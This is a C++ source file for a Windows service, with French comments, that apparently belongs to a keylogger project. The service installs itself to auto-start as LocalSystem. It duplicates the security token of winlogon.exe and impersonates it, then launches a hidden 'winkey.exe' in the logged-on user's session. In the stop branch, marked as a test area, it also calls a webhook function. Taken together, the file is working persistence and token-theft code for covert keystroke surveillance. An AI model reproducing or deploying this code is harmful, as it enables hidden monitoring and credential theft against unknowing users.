#include "svc.hpp"

#include "webhook.hpp"


DWORD FindTargetPID(const wchar_t* targetName)
{
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	if (Process32FirstW(snapshot, &pe))
	{
		do
		{
			if (wcscmp(pe.szExeFile, targetName) == 0)
			{
				CloseHandle(snapshot);
				return pe.th32ProcessID;
			}
		} while (Process32NextW(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return 0;
}

int InstallService()
{
	
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szPath[MAX_PATH];

    if (!GetModuleFileName(NULL, szPath, MAX_PATH))
    {
        _tprintf(_T("Cannot get module filename (%lu)\n"), GetLastError());
        return 0;
    }

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == schSCManager)
    {
        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
        return 0;
    }

    schService = CreateService(
        schSCManager,              // SCM database
        SERVICE_NAME,              // name of service
        SERVICE_NAME,              // service name to display
        SERVICE_ALL_ACCESS,        // desired access
        SERVICE_WIN32_OWN_PROCESS, // service type
        SERVICE_AUTO_START,        // start type
        SERVICE_ERROR_NORMAL,      // error control type
        szPath,                    // path to service's binary
        NULL,                      // no load ordering group
        NULL,                      // no tag identifier
        NULL,                      // no dependencies
        NULL,                      // LocalSystem account
        NULL);                     // no password

    if (schService == NULL)
    {
        _tprintf(_T("CreateService failed (%lu)\n"), GetLastError());
        CloseServiceHandle(schSCManager);
        return 0;
    }

    _tprintf(_T("Service installed successfully\n"));
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return 1;
}

int StartService()
{
    SC_HANDLE schSCManager;
    SC_HANDLE schService;

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL)
    {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED)
            _tprintf(_T("Access denied. Please run as administrator.\n"));
        else
            _tprintf(_T("OpenSCManager failed (%lu)\n"), error);
        return 0;
    }

    schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_START);
    if (schService == NULL)
    {
        _tprintf(_T("OpenService failed (%lu)\n"), GetLastError());
        CloseServiceHandle(schSCManager);
        return 0;
    }

    if (!StartService(schService, 0, NULL))
    {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_ALREADY_RUNNING)
            _tprintf(_T("Service is already running\n"));
        else
        {
            _tprintf(_T("StartService failed (%lu)\n"), error);
            CloseServiceHandle(schService);
            CloseServiceHandle(schSCManager);
            return 0;
        }
    }
    else
        _tprintf(_T("Service start pending...\n"));

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return 1;
}

int StopService()
{
	SC_HANDLE schSCManager;
    SC_HANDLE schService;
    SERVICE_STATUS ssStatus;

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL)
    {
        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
        return 0;
    }

    schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (schService == NULL)
    {
        _tprintf(_T("OpenService failed (%lu)\n"), GetLastError());
        CloseServiceHandle(schSCManager);
        return 0;
    }

    if (!ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
        _tprintf(_T("ControlService failed (%lu)\n"), GetLastError());
    else
        _tprintf(_T("Service stopped successfully\n"));

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return 1;
}

int DeleteService()
{
	SC_HANDLE schSCManager;
    SC_HANDLE schService;

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL)
    {
        _tprintf(_T("OpenSCManager failed (%lu)\n"), GetLastError());
        return 0;
    }

    schService = OpenService(schSCManager, SERVICE_NAME, DELETE);
    if (schService == NULL)
    {
        _tprintf(_T("OpenService failed (%lu)\n"), GetLastError());
        CloseServiceHandle(schSCManager);
        return 0;
    }

    if (!DeleteService(schService))
        _tprintf(_T("DeleteService failed (%lu)\n"), GetLastError());
    else
        _tprintf(_T("Service deleted successfully\n"));

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
    return 1;
}


// ServiceMain: Entry point for the service.
// Parameters:
//   argc  - Number of command line arguments.
//   argv  - Array of command line arguments.
VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    UNREFERENCED_PARAMETER(argc);
    UNREFERENCED_PARAMETER(argv);

    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (g_StatusHandle == NULL)
    {
        _tprintf(_T("RegisterServiceCtrlHandler failed (%lu)\n"), GetLastError());
        return;
    }

    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
        _tprintf(_T("SetServiceStatus failed (%lu)\n"), GetLastError());
        if (g_ServiceStopEvent)
            CloseHandle(g_ServiceStopEvent);
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        return;
    }

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL)
    {
        DWORD dwError = GetLastError();
        _tprintf(_T("CreateEvent failed (%lu)\n"), dwError);
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = dwError;
        g_ServiceStatus.dwCheckPoint = 1;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
        _tprintf(_T("SetServiceStatus (SERVICE_RUNNING) failed (%lu)\n"), GetLastError());
        if (g_ServiceStopEvent)
            CloseHandle(g_ServiceStopEvent);
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        return;
    }

    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    else
    {
        _tprintf(_T("CreateThread failed (%lu)\n"), GetLastError());
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    }

    if (g_ServiceStopEvent != NULL)
        CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        // Terminer le processus winkey.exe
        if (g_ProcessInfo.hProcess != NULL)
        {
            TerminateProcess(g_ProcessInfo.hProcess, 0);
            CloseHandle(g_ProcessInfo.hProcess);
            CloseHandle(g_ProcessInfo.hThread);
        }

        SetEvent(g_ServiceStopEvent);
        break;

    default:
        break;
    }
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
	UNREFERENCED_PARAMETER(lpParam);
    STARTUPINFO si;
    TCHAR szPath[MAX_PATH];
    TCHAR szDir[MAX_PATH];
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF)
    {
        _tprintf(_T("Failed to get active console session ID (%lu)\n"), GetLastError());
        return ERROR_PROCESS_ABORTED;
    }

    HANDLE htoken = NULL;
    if (!WTSQueryUserToken(sessionId, &htoken))
    {
        _tprintf(_T("WTSQueryUserToken failed (%lu)\n"), GetLastError());
        return ERROR_PROCESS_ABORTED;
    }

    // recuperer le token de sécurité d'un processus et l'utiliser pour créer un processus dans la session utilisateur
    const wchar_t* targetProcess = _T("winlogon.exe");
    DWORD pid = FindTargetPID(targetProcess);
    if (pid == 0)
    {
        _tprintf(_T("Target process not found.\n"));
        CloseHandle(htoken);
        return ERROR_PROCESS_ABORTED;
    }
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess)
	{
		wprintf(_T("OpenProcess failed (%lu)\n"), GetLastError());
		return 1;
	}
    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &htoken))
    {
        _tprintf(_T("OpenProcessToken failed (%lu)\n"), GetLastError());
        CloseHandle(hProcess);
        CloseHandle(htoken);
        return ERROR_PROCESS_ABORTED;
    }
    if (!DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &htoken))
    {
        _tprintf(_T("DuplicateTokenEx failed (%lu)\n"), GetLastError());
        CloseHandle(hProcess);
        CloseHandle(htoken);
        return ERROR_PROCESS_ABORTED;
    }
    if (!ImpersonateLoggedOnUser(htoken))
    {
        _tprintf(_T("ImpersonateLoggedOnUser failed (%lu)\n"), GetLastError());
        CloseHandle(hProcess);
        CloseHandle(htoken);
        return ERROR_PROCESS_ABORTED;
    }
    


    // Obtenir le répertoire du service
    GetModuleFileName(NULL, szPath, MAX_PATH);
    _tcscpy_s(szDir, MAX_PATH, szPath);
    TCHAR* lastSlash = _tcsrchr(szDir, _T('\\'));
    if (lastSlash) *lastSlash = _T('\0');

    // Construire le chemin vers winkey.exe
    _stprintf_s(szPath, MAX_PATH, _T("%s\\winkey.exe"), szDir);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = _T("winsta0\\default"); // Desktop interactif
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Cacher la fenêtre

    ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));

    // Lancer winkey.exe dans la session utilisateur
    if (!CreateProcessAsUser(htoken, NULL, szPath, NULL, NULL, FALSE, 
                           CREATE_NEW_CONSOLE, NULL, szDir, &si, &g_ProcessInfo))
    {
        CloseHandle(htoken);
        return GetLastError();
    }

    // Attendre que le service soit arrêté ou que le processus se ferme
    HANDLE handles[2] = { g_ServiceStopEvent, g_ProcessInfo.hProcess };
    DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);

    if (waitResult == WAIT_OBJECT_0)
    {
        // Service arrêté - terminer le processus
        TerminateProcess(g_ProcessInfo.hProcess, 0);
    }

    CloseHandle(g_ProcessInfo.hProcess);
    CloseHandle(g_ProcessInfo.hThread);

    return ERROR_SUCCESS;
}

int _tmain(int argc, TCHAR *argv[])
{
    // Si aucun argument, c'est le SCM qui lance le service
    if (argc == 1)
    {
        // Point d'entrée du service - appelé par le SCM
        SERVICE_TABLE_ENTRY ServiceTable[] = 
        {
            { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
            { NULL, NULL }
        };

        if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
        {
            _tprintf(_T("StartServiceCtrlDispatcher failed (%lu)\n"), GetLastError());
            return 1;
        }
        return 0;
    }

    if (argc < 2)
    {
        _tprintf(_T("Usage: %s <options>\n"), argv[0]);
        return 1;
    }
    
	if (_tcscmp(argv[1], _T("install")) == 0)
	{
		_tprintf(_T("Installing service...\n"));
		if (!InstallService())
		{
			_tprintf(_T("Failed to install service.\n"));
			return 1;
		}
		_tprintf(_T("Service installed successfully.\n"));
	}
	else if (_tcscmp(argv[1], _T("start")) == 0)
	{
		_tprintf(_T("Starting service...\n"));
		if (!StartService())
		{
			_tprintf(_T("Failed to start service.\n"));
			return 1;
		}
		_tprintf(_T("Service started successfully.\n"));
	}
	else if (_tcscmp(argv[1], _T("stop")) == 0)
	{
        // TEST AREA 
        webhookCall(NULL); // Call the webhook function
		_tprintf(_T("Stopping service...\n"));
		if (!StopService())
		{
			_tprintf(_T("Failed to stop service.\n"));
			return 1;
		}
		_tprintf(_T("Service stopped successfully.\n"));
	}
	else if (_tcscmp(argv[1], _T("delete")) == 0)
	{
		_tprintf(_T("Deleting service...\n"));
		if (!DeleteService())
		{
			_tprintf(_T("Failed to delete service.\n"));
			return 1;
		}
		_tprintf(_T("Service deleted successfully.\n"));
	}
	else
	{
		_tprintf(_T("Unknown option: %s\n"), argv[1]);
		return 1;
	}
}
